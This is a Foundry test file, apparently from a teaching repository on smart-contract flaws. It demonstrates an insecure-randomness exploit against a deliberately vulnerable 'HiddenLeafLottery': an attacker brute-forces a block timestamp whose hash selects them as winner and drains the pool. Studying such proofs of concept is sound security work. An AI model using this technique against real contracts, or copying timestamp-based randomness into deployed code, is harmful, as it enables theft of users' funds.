// SPDX-License-License: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../../../src/Multiverse-Case-Studies/Insecure-Randomness/HiddenLeafLottery.sol";

contract HiddenLeafLotteryTest is Test {
    HiddenLeafLottery lottery;
    address naruto = makeAddr("Naruto");
    address orochimaru = makeAddr("Orochimaru");
    address hokage = makeAddr("Hokage");

    function setUp() public {
        vm.prank(hokage);
        lottery = new HiddenLeafLottery();
        vm.deal(naruto, 1 ether);
        vm.deal(orochimaru, 1 ether);

        // Naruto enters
        vm.prank(naruto);
        lottery.enter{value: 1 ether}();
    }

    function testRandomnessExploit() public {
        // Step 1: Orochimaru enters
        vm.prank(orochimaru);
        lottery.enter{value: 1 ether}();

        // Step 2: Orochimaru manipulates timestamp
        uint256 targetTimestamp = block.timestamp;
        uint256 position = 2;
        while (true) {
            uint256 random = uint256(keccak256(abi.encodePacked(targetTimestamp, position)));
            uint256 winnerIndex = random % position;
            if (winnerIndex == 1) break; // Orochimaru is second ninja
            targetTimestamp++;
        }
        vm.warp(targetTimestamp);

        // Step 3: Hokage triggers draw
        vm.prank(hokage);
        lottery.drawWinner();

        // Step 4: Verify Orochimaru won
        assertEq(orochimaru.balance, 2 ether, "Orochimaru did not win jackpot");
        assertEq(lottery.getPoolBalance(), 0, "Pool not drained");
    }
}
